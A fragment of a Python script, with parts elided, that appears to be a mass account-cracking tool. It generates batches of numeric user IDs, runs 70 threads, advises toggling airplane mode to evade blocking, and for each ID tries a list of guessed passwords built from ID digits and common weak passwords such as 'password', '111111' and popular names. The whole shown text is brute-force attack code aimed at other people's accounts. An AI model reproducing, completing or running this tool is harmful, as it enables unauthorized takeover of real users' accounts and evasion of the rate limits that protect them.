...
def fuck():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=70) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        ...
        print('[×] Off/On Your Airplane/Flight Mode If Not Get IDs')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','mimmim','sadiya','i love you','sumaiya','112233','jannati','sabbir','israt1','i hate you','password','111111']
